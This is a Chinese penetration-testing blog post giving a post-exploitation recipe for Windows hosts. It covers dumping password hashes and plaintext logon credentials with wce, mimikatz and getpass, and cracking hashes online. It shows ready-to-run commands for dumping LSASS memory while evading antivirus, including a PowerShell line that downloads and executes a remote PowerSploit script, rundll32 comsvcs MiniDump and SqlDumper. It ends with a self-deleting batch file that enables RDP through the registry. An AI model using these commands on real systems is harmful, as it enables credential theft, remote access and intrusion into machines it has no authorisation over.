---
draft: false
date: 2016-08-08 08:28:27
title: 导出 Windows 主机密码与开启 3389
description: 
categories:
  - Pentest
tags:
  - intranet
---

### 0x00 导出主机密码hash
* 关于Windows的hash
    * 早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash
    * Windows hash由LM HASH和NT HASH两部分组成，形式为：用户名称:RID:LM-HASH值:NT-HASH值
    * 存储Windows hash的sam文件位置为：C:\windows\system32\config\SAM

* 导出hash条件
    * administrator以上权限

* 导出hash工具
    * wce
    * gethash
    * hashdump
    * SAMInside

* 上传工具得到hash
![查看是否为管理员以上权限](/img/post/privilge_escalation_win_view_whoami.png)
![上传wce](/img/post/privilge_escalation_win_upload_wce.png)
![得到hash](/img/post/privilge_escalation_win_get_hash.png)

* 在线网站解密hash
    * LM Hash和NT Hash得到一个就可以解密，不过两个都得到的话解密的成功率会更高
    * 可以在[http://www.objectif-securite.ch/ophcrack.php](http://www.objectif-securite.ch/ophcrack.php?_blank)解密
    ![解出密码](/img/post/privilge_escalation_win_get_pwd.png)

### 0x01 导出主机密码
* 条件
    * administrator以上权限
    * 当前管理员没有注销登陆(可以通过query user命令看出)

* 工具
    * mimikatz
    * getpass

* 上传工具得到密码
![查看是否为管理员以上权限](/img/post/privilge_escalation_win_view_whoami.png)
![查看管理员是否注销登陆](/img/post/privilge_escalation_win_query_user.png)
![上传getpass](/img/post/privilge_escalation_win_upload_getpass.png)
![得到密码1](/img/post/privilge_escalation_win_getpass1.png)
![得到密码2](/img/post/privilge_escalation_win_getpass2.png)

* 导出NTLM Hash本地得到密码  
    若 mimikatz 和 getpass 这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密
    * 导出文件 hash 文件  
        * 上传 Procdump.exe 导出

        > ```
        Procdump.exe -accepteula -ma lsass.exe lsass.dmp
        ```

        * 或者执行 PowerShell 导出

        > ```
        powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); "Get-Process lsass | Out-Minidump"

        或者
        tasklist /svc |findstr lsass.exe #查看 lsass.exe 的 pid
        powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full"
        ```

        * 或者用 SqlDumper.exe 导出

        > ```
        tasklist /svc |findstr lsass.exe #查看 lsass.exe 的 pid
        "C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe" <pid> 0 0x01100
        ```

    * 下载导出的dmp文件后用本地mimikatz解密  
        先输入：```mimikatz.exe "sekurlsa::minidump lsass.dmp"```  
        后输入：sekurlsa::logonpasswords

### 0x02 开启3389
* 直接使用注册表
![新建开3389的注册表](/img/post/privilge_escalation_win_new_file_3389_reg.png)
![开3389端口](/img/post/privilge_escalation_win_open_3389.png)
![成功开启3389端口](/img/post/privilge_escalation_win_open_3389_success.png)

* 写一个批处理也行
```
# 3389.bat内容如下：
echo Windows Registry Editor Version 5.00>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg 
echo "fDenyTSConnections"=dword:00000000>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg 
echo "PortNumber"=dword:00000d3d>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg 
echo "PortNumber"=dword:00000d3d>>3389.reg 
regedit /s 3389.reg 
del 3389.reg
del 3389.bat
```
![新建开3389的注册表](/img/post/privilge_escalation_win_new_file_3389_bat.png)


#### Reference(侵删)：
[https://www.cnblogs.com/hiccup/p/4380298.html](https://www.cnblogs.com/hiccup/p/4380298.html?_blank)